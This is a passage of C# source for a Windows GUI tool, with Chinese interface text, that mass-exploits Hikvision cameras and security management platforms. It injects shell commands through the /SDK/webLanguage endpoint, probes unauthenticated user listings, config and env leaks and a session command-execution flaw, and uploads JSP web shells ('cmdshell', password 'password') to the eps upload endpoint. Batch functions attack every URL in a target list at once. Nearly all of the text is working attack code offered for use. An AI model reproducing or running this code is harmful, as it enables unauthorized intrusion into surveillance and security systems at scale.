                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                richTextBox6.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");





            }

        }

        public void mingling1()
        {

            try
            {


                if (textBox1.Text == "")
                {

                    richTextBox6.Text = "未输入任何地址!";
                }
                else
                {





                    DateTime now = DateTime.Now;
                    string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                    ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                    String url = textBox1.Text + "/SDK/webLanguage";

                    //    MessageBox.Show("默认请求路径/mz");
                    //     MessageBox.Show("默认执行env命令");
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                    request.Method = "PUT"; //get请求方法
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    request.ContentType = "application/xml";
                    request.Credentials = null;
                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                    string xmlData = "<?xml version='1.0' encoding='UTF-8'?><language>$(" + textBox8.Text + " > webLib/mz)</language>";
                    //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                    //   request.ContentLength = postData.Length;
                    //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    byte[] byte1 = encoding.GetBytes(xmlData);
                    request.ContentLength = byte1.Length;
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());
                    ss.Write(xmlData);
                    ss.Flush();
                    button6.Enabled = true;
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    Stream getStream = response.GetResponseStream();
                    StreamReader streamreader = new StreamReader(getStream);
                    String sss = streamreader.ReadToEnd();
                    if (response.StatusCode == HttpStatusCode.InternalServerError)
                    {

                        // richTextBox6.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision 远程代码执行漏洞");
                        yanzheng();
                    }
                    else
                    {

                        //   richTextBox6.AppendText(now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");

                    }




                }
            }

            catch (Exception ex)
            {


                richTextBox6.AppendText("\n" + "命令执行失败");





            }

        }

        public void mingling()
        {

            try
            {









                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox1.Text + "/SDK/webLanguage";

                //    MessageBox.Show("默认请求路径/mz");
                //     MessageBox.Show("默认执行env命令");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                request.Method = "PUT"; //get请求方法
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "*/*";
                request.ContentType = "application/xml";
                request.Credentials = null;
                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                string xmlData = "<?xml version='1.0' encoding='UTF-8'?><language>$(" + textBox8.Text + " > webLib/mz)</language>";
                //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                //   request.ContentLength = postData.Length;
                //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(xmlData);
                request.ContentLength = byte1.Length;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());
                ss.Write(xmlData);
                ss.Flush();
                button6.Enabled = true;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream);
                String sss = streamreader.ReadToEnd();
                if (response.StatusCode == HttpStatusCode.InternalServerError)
                {

                    richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision 远程代码执行漏洞");
                    yanzheng();
                }
                else
                {

                    richTextBox1.AppendText(now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");

                }





            }

            catch (Exception ex)
            {


                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");




            }

        }



        private void button1_Click(object sender, EventArgs e)
        {

            richTextBox1.Text = "";



            string url1 = textBox1.Text;
            string pattern = "(?<!://)(//+)";
            // 使用Regex.Replace去除匹配到的斜杠
            string result = Regex.Replace(url1, pattern, "/");




            mingling();
            // yanzheng();
            ivms();
            isecure();
            config();
            env();
            report();
            api();


            try
            {
                //   String aa = textBox1.Text;
                //  if (!aa.StartsWith("http://") && !aa.StartsWith("https://"))
                //   {



                //   richTextBox1.Text = "请检查";
                //    String shuru = textBox1.Text;
                //       bool has = Regex.IsMatch(shuru, @"&^(https?)$");

                //   if (has)
                //    {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                //    string text = textBox1.Text;
                //   bool isValid = Regex.IsMatch(text, @"^(http://|https://)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$");
                // //   if (isValid)
                //    {
                // richTextBox1.Text = "\n" + "[-]" + timeString;
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string url = textBox1.Text + "/Security/users?auth=YWRtaW46MTEK ";


                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                HttpStatusCode statusCode = response.StatusCode;
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                if (s.Contains("<userName>"))
                {
                    {

                        richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[+]存在Hikvision 摄像头未授权访问漏洞");

                        richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "/System/configurationFile?auth=YWRtaW46MTEK");

                    }

                }
                else
                {

                    richTextBox1.AppendText("\n+" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 摄像头未授权访问漏洞");
                }










                //  richTextBox1.Text = "拼写错误";




                //    else
                //    {

                //      richTextBox1.AppendText("请加入http或https");







            }
            catch (Exception ex)


            {
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                //MessageBox.Show(ex.Message);
                richTextBox1.AppendText("\n" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 摄像头未授权访问漏洞");

            }




        }
        private void timer1_Tick(object sender, EventArgs e)
        {


        }

        private void button9_Click(object sender, EventArgs e)
        {

            if (comboBox1.SelectedIndex == -1)
            {
                MessageBox.Show("请选择模块测试");

            }

            if (comboBox1.SelectedIndex >= 0)
            {

                int s = comboBox1.SelectedIndex;
                if (s == 0)
                {
                    mingling();
                    // yanzheng();
                    ivms();
                    isecure();
                    config();
                    env();
                    report();
                    api();
                    ss();

                }

                if (s == 1)
                {
                    ss();

                }

                if (s == 2)
                {

                    mingling();
                }
                if (s == 3)
                {

                    ivms();
                }

                if (s == 4)
                {
                    isecure();

                }
                if (s == 5)
                {
                    config();

                }
                if (s == 6)
                {
                    env();

                }
                if (s == 7)
                {
                    report();

                }
                if (s == 8)
                    api();








            }

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        public void p3()
        {
            //    richTextBox2.AppendText("正在开始批量检测......." + "\n");
            //    richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");
            DateTime now = DateTime.Now;
            string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            string dictionaryPath1 = "hikvision.txt";
            string[] urls = File.ReadAllLines(dictionaryPath1);

            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    //   foreach (String m in urls)
                    //     {


                    String targeturl11 = urla + "/portal/conf/config.properties";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);
                    request.Method = "GET"; //get请求方法
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    HttpStatusCode statusCode = response.StatusCode;
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    string s = reader.ReadToEnd();  //字符串S读取接收结果
                    if (s.Contains("bic.serviceDirectory.ip"))
                    {
                        {

                            richTextBox2.AppendText("\n" + now + urla + "[+]存在Hikvision综合安防管理平台config信息泄露漏洞");

                            richTextBox2.AppendText("\n" + now + urla + "/portal/conf/config.properties");

                        }

                    }
                    else
                    {

                        //    richTextBox1.AppendText("\n+" + now + "目标" + textBox1.Text + "[-]不存在Hikvision 摄像头未授权访问漏洞");
                    }


                });

            }


        }
        public void p2()
        {
            //    richTextBox2.AppendText("正在开始批量检测......." + "\n");
            //  richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");
            DateTime now = DateTime.Now;
            string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            string dictionaryPath1 = "hikvision.txt";
            string[] urls = File.ReadAllLines(dictionaryPath1);

            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    //   foreach (String m in urls)
                    //     {


                    String targeturl11 = urla + "/center/api/files;.js";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);
                    request.Method = "GET";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    String s = reader.ReadToEnd();
                    if (s.Contains("404"))
                    {


                    }
                    //      {
                    //   richTextBox1.AppendText("\n" + now +urla + "[-]不存在Hikvision isecure center文件上传漏洞");

                    //   richTextBox1.Text = s;
                    //    }
                    //
                    else if (s.Contains("url is error"))
                    {

                        richTextBox2.AppendText("\n" + now + urla + "[+]可能存在Hikvision isecure center文件上传漏洞");
                    }
                    {
                        {


                        }

                    }
                });



            }


        }

        public void pl()
        {


            try
            {


                //    richTextBox2.AppendText("正在开始批量检测......." + "\n");
                //   richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string dictionaryPath1 = "hikvision.txt";
                string[] urls = File.ReadAllLines(dictionaryPath1);

                Task[] tasks = new Task[urls.Length];
                for (int i = 0; i < urls.Length; i++)
                {

                    String urla = urls[i];
                    tasks[i] = Task.Run(() =>
                    {

                        //   foreach (String m in urls)
                        //     {


                        String targeturl11 = urla + "/eps/api/resourceOperations/upload";
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);

                        request.AllowAutoRedirect = false;
                        request.Method = "POST"; //get请求方法
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                        request.ContentType = "application/x-www-form-urlencoded";
                        //       request.Credentials = null;
                        //    request.Headers.Add("Sec-Fetch-Dest", "document");
                        //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                        //    request.Headers.Add("Sec-Fetch-Site", "none");
                        //    request.Headers.Add("Sec-Fetch-User", "?1");
                        //   request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                        string xmlData = "service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action";
                        //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                        //   request.ContentLength = postData.Length;
                        //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                        ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                        byte[] byte1 = encoding.GetBytes(xmlData);
                        request.ContentLength = byte1.Length;
                        StreamWriter ss = new StreamWriter(request.GetRequestStream());
                        ss.Write(xmlData);
                        ss.Flush();
                        // button6.Enabled = true;
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                        Stream getStream = response.GetResponseStream();
                        StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);
                        HttpStatusCode statusCode = response.StatusCode;

                        String s = streamreader.ReadToEnd();
                        if (s.Contains("errorMessage"))
                        {

                            richTextBox2.AppendText("\n" + now + urla + "[+]存在Hikvision iVMS综合安防系统任意文件上传漏洞");
                        }
                        else
                        {
                            //      richTextBox1.AppendText("\n" + urla + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");

                        }



                        //  button11.Visible = true;


                    });



                }


            }
            catch (Exception ex)
            {


            }



        }

        public void p5()
        {
            DateTime now = DateTime.Now;
            string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            string dictionaryPath1 = "hikvision.txt";
            string[] urls = File.ReadAllLines(dictionaryPath1);

            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    //   foreach (String m in urls)
                    //     {


                    String targeturl11 = urla + "/artemis-portal/artemis/env";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);
                    request.Method = "GET";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    // request.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    String s = reader.ReadToEnd();
                    if (s.Contains("java.class.path"))
                    {

                        richTextBox2.AppendText("\n" + now + urla + "[+]存在Hikvision综合安防管理平台env信息泄露漏洞");
                        //     richTextBox1.Text = s;
                        richTextBox2.AppendText(urla + "/artemis-portal/artemis/env");
                    }







                });


            }

        }


        public void p4()
        {

            try
            {


                //    richTextBox2.AppendText("正在开始批量检测......." + "\n");
                //   richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");
                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string dictionaryPath1 = "hikvision.txt";
                string[] urls = File.ReadAllLines(dictionaryPath1);

                Task[] tasks = new Task[urls.Length];
                for (int i = 0; i < urls.Length; i++)
                {

                    String urla = urls[i];
                    tasks[i] = Task.Run(() =>
                    {

                        //   foreach (String m in urls)
                        //     {


                        String targeturl11 = urla + "/center/api/session";
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl11);

                        request.AllowAutoRedirect = false;
                        request.Method = "POST"; //get请求方法
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        request.Accept = "application/json, text/plain, */*";
                        request.ContentType = "application/json;charset=UTF-8";
                        request.Headers.Add("Testcmd", "echo test");
                        //       request.Credentials = null;
                        //    request.Headers.Add("Sec-Fetch-Dest", "document");
                        //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                        //    request.Headers.Add("Sec-Fetch-Site", "none");
                        //    request.Headers.Add("Sec-Fetch-User", "?1");
                        //   request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                        string xmlData = textBox7.Text;

                        //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                        //   request.ContentLength = postData.Length;
                        //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                        ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                        byte[] byte1 = encoding.GetBytes(xmlData);
                        request.ContentLength = byte1.Length;
                        StreamWriter ss = new StreamWriter(request.GetRequestStream());
                        ss.Write(xmlData);
                        ss.Flush();
                        // button6.Enabled = true;
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                        Stream getStream = response.GetResponseStream();
                        StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);
                        HttpStatusCode statusCode = response.StatusCode;

                        String s = streamreader.ReadToEnd();
                        //     if(s.Contains("fail"))
                        //  {


                        //   richTextBox2.AppendText("\n" + now + urla + "[-]不存在Hikvision综合安防管理平台api session命令执行漏洞");
                        //        // richTextBox2.Text = s;
                        //   }


                        if (s.Contains("json转换失败"))
                        {

                            richTextBox2.AppendText("\n" + now + urla + "[+]存在Hikvision综合安防管理平台api session命令执行漏洞");
                        }








                        //      richTextBox1.AppendText("\n" + urla + "[-]不存在Hikvision iVMS综合安防系统任意文件上传漏洞");





                        //  button11.Visible = true;


                    });



                }


            }
            catch (Exception ex)
            {


            }

        }








        public void ds()
        {


            DateTime now = DateTime.Now;
            string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

            richTextBox2.AppendText("加载成功" + "\n");
            richTextBox2.AppendText("正在开始批量检测......." + "\n");
            richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");

            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "hikvision.txt";
            string[] urls = File.ReadAllLines(dictionaryPath);


            //    foreach (String url in urls)
            //     {



            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    try
                    {



                        String urlss = urla + "/SDK/webLanguage";
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                        request.Method = "PUT";
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        request.Accept = "*/*";
                        request.ContentType = "application/xml";

                        //    request.Headers.Add("Sec-Fetch-Dest", "document");
                        //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                        //    request.Headers.Add("Sec-Fetch-Site", "none");
                        //    request.Headers.Add("Sec-Fetch-User", "?1");
                        request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                        string xmlData1 = "<?xml version='1.0' encoding='UTF-8'?><language>$(whoami > webLib/mz)</language>";
                        //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                        //   request.ContentLength = postData.Length;
                        //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                        //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                        //        byte[] byte1 = encoding.GetBytes(xmlData);
                        //      request.ContentLength = byte1.Length;
                        StreamWriter ss = new StreamWriter(request.GetRequestStream());
                        ss.Write(xmlData1);
                        ss.Close();

                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                        Stream getStream = response.GetResponseStream();
                        StreamReader streamreader = new StreamReader(getStream);
                        String sss = streamreader.ReadToEnd();
                        if (response.StatusCode == HttpStatusCode.InternalServerError)
                        {

                            richTextBox2.AppendText("\n" + now + "目标" + urla + "[+]存在Hikvision 远程代码执行漏洞");
                            // yanzheng();
                        }
                        else
                        {

                            //  richTextBox1.AppendText(now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");
                        }





                    }





                    catch (Exception ex)
                    {


                    }


                    richTextBox2.AppendText(urla + "批量进行中" + "\n");

                });

            }

        }



        private void button4_Click(object sender, EventArgs e)
        {

            pl();
            p2();
            p3();
            p4();
            p5();
            try
            {












                DateTime now = DateTime.Now;
                string timeString = now.ToString("yyyy-MM-dd HH:mm:ss");

                richTextBox2.AppendText("加载成功" + "\n");
                richTextBox2.AppendText("正在开始批量检测......." + "\n");
                richTextBox2.AppendText("仅显示存在漏洞的网站！！！请等待检测结束" + "\n");

                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

                string dictionaryPath = "hikvision.txt";
                string[] urls = File.ReadAllLines(dictionaryPath);


                //    foreach (String url in urls)
                //     {



                Task[] tasks = new Task[urls.Length];
                for (int i = 0; i < urls.Length; i++)
                {

                    String urla = urls[i];
                    tasks[i] = Task.Run(() =>
                    {

                        try
                        {



                            String urlss = urla + "/SDK/webLanguage";
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                            request.Method = "PUT";
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                            request.Accept = "*/*";
                            request.ContentType = "application/xml";

                            //    request.Headers.Add("Sec-Fetch-Dest", "document");
                            //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                            //    request.Headers.Add("Sec-Fetch-Site", "none");
                            //    request.Headers.Add("Sec-Fetch-User", "?1");
                            request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                            string xmlData1 = "<?xml version='1.0' encoding='UTF-8'?><language>$(whoami > webLib/mz)</language>";
                            //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                            //   request.ContentLength = postData.Length;
                            //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                            //       ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                            //        byte[] byte1 = encoding.GetBytes(xmlData);
                            //      request.ContentLength = byte1.Length;
                            StreamWriter ss = new StreamWriter(request.GetRequestStream());
                            ss.Write(xmlData1);
                            ss.Close();

                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                            Stream getStream = response.GetResponseStream();
                            StreamReader streamreader = new StreamReader(getStream);
                            String sss = streamreader.ReadToEnd();
                            if (response.StatusCode == HttpStatusCode.InternalServerError)
                            {

                                richTextBox2.AppendText("\n" + now + "目标" + urla + "[+]存在Hikvision 远程代码执行漏洞");
                                // yanzheng();
                            }
                            else
                            {

                                //  richTextBox1.AppendText(now + "目标" + textBox1.Text + "[-]不存在Hikvision 远程代码执行漏洞");
                            }





                        }





                        catch (Exception ex)
                        {


                        }


                        richTextBox2.AppendText(urla + "批量进行中" + "\n");

                    });



                }






            }
            catch (Exception ex)
            {


            }


        }

        private void button3_Click_1(object sender, EventArgs e)
        {



            if (comboBox3.SelectedIndex == -1)
            {
                MessageBox.Show("请选择模块测试");

            }

            if (comboBox3.SelectedIndex >= 0)
            {

                int s = comboBox3.SelectedIndex;
                if (s == 0)
                {

                    richTextBox2.AppendText("已选择Hikvision 远程代码执行漏洞模块" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    ds();
                }

                if (s == 1)
                {

                    richTextBox2.AppendText("已选择Hikvision iVMS综合安防系统任意文件上传漏洞模块" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    pl();
                }

                if (s == 2)
                {


                    richTextBox2.AppendText("已选择Hikvision综合安防管理平台isecure center文件上传漏洞模块" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    p2();
                }
                if (s == 3)
                {

                    richTextBox2.AppendText("已选择Hikvision综合安防管理平台config信息泄露漏洞模块" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    p3();

                }
                if (s == 4)
                {
                    richTextBox2.AppendText("已选择Hikvision综合安防管理平台api session命令执行漏洞模块" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    p4();


                }

                if (s == 5)
                {
                    richTextBox2.AppendText("已选择Hikvision综合安防管理平台env信息泄漏漏洞" + "\n");
                    richTextBox2.AppendText("正在开始批量检测" + "\n");
                    p5();
                }
            }


        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {

            try
            {



                String text = richTextBox2.Text;
                string filePath = "D:\\ss.txt";
                File.WriteAllText(filePath, richTextBox2.Text);
                MessageBox.Show("导出成功 D:\\ss.txt");


            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            if (comboBox4.SelectedIndex == -1)
            {
                MessageBox.Show("请选择模块测试");

            }

            if (comboBox4.SelectedIndex >= 0)
            {

                int s = comboBox4.SelectedIndex;
                if (s == 0)
                {

                    mingling1();
                }

                if (s == 1)
                {

                    cmd();

                }
            }

        }

        private void tabPage6_Click(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (comboBox4.SelectedIndex == -1)
            {
                MessageBox.Show("请选择模块测试");

            }

            if (comboBox4.SelectedIndex >= 0)
            {

                int s = comboBox4.SelectedIndex;
                if (s == 0)
                {

                    mingling2();
                }

                if (s == 1)
                {

                    api2();

                }
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {

            try
            {


                if (textBox5.Text == "")
                {

                    richTextBox4.AppendText("端口未配置" + "\n");
                }
                if (textBox4.Text == "")
                {
                    richTextBox4.AppendText("地址未配置" + "\n");
                }
                else
                {




                    WebProxy proxy = new WebProxy("http://" + textBox4.Text + ":" + textBox5.Text, true);
                    WebRequest.DefaultWebProxy = proxy;
                    richTextBox4.AppendText("配置完成" + "\n");
                    richTextBox4.AppendText("代理IP:" + textBox4.Text + "\n");
                    richTextBox4.AppendText("代理端口:" + textBox5.Text + "\n");
                }

            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (comboBox5.SelectedIndex == -1)
            {
                MessageBox.Show("请选择模块测试");

            }

            if (comboBox5.SelectedIndex >= 0)
            {

                int s = comboBox5.SelectedIndex;
                if (s == 0)
                {

                    ivms1();
                }

                if (s == 1)
                {

                    isecure2();
                }
                if (s == 2)
                {
                    report1();


                }

            }





        }

        public void getshell3()
        {
            try
            {


                if (textBox9.Text == "")
                {

                    MessageBox.Show("请输入token!!!");
                }
                else
                {








                    string filePath = "ca1a55c8c1a4966c1.jsp";
                    string uploadUrl = textBox1.Text + "/eps/api/resourceOperations/upload?token=" + textBox9.Text; // 替换为接口的URL
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                    request.Method = "POST";
                    request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";


                    string formDataFooter = "\r\n-----------------------------8db86cc218de63f--";
                    byte[] fileBytes = File.ReadAllBytes(filePath);
                    string formDataTemplate = "-----------------------------8db86cc218de63f\r\n" +
                                      "Content-Disposition: form-data; name=\"fileUploader\"; filename=\"ca1a55c8c1a4966c1.jsp\"\r\n" +
                                      "Content-Type: image/jpeg\r\n\r\n";
                    long formDataLength = formDataTemplate.Length + fileBytes.Length + formDataFooter.Length;
                    request.ContentLength = formDataLength;
                    Stream requestStream = request.GetRequestStream();
                    byte[] formHeadBytes = System.Text.Encoding.UTF8.GetBytes(formDataTemplate);
                    requestStream.Write(formHeadBytes, 0, formHeadBytes.Length);
                    requestStream.Write(fileBytes, 0, fileBytes.Length);
                    byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                    requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    Stream responseStream = response.GetResponseStream();
                    StreamReader reader = new StreamReader(responseStream);
                    string ssss = reader.ReadToEnd();
                    JsonDocument doc = JsonDocument.Parse(ssss);
                    JObject jobj = JObject.Parse(ssss);
                    String res = doc.RootElement.GetProperty("data").GetProperty("resourceUuid").GetString();
                    textBox2.Text = res;
                    richTextBox7.Text = jobj["message"].ToString();
                    if (richTextBox7.Text == "上传附件成功")
                    {

                        richTextBox3.AppendText("cmdshell上传成功" + "url:" + "/eps/upload" + "/" + textBox2.Text + ".jsp" + "密码:password");
                    }
                    else if (richTextBox7.Text == "上传附件失败:null")

                        richTextBox3.AppendText("cmdshell上传失败" + "url:" + "/eps/upload" + "/" + filePath);


                }
            }
            catch (Exception ex)
            {

                richTextBox3.AppendText("\n" + "cmdshell上传失败");


            }

        }

        public void getshell2()
        {
            try
            {
                if (textBox1.Text == "")
                {

                    MessageBox.Show("请输入地址!!!");
                }



                if (textBox9.Text == "")
                {

                    MessageBox.Show("请输入token!!!");
                }
                else
                {








                    string filePath = "a8d8535787929df71.jsp";
                    string uploadUrl = textBox1.Text + "/eps/api/resourceOperations/upload?token=" + textBox9.Text; // 替换为接口的URL
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uploadUrl);
                    request.Method = "POST";
                    request.ContentType = "multipart/form-data; boundary=---------------------------8db86cc218de63f";
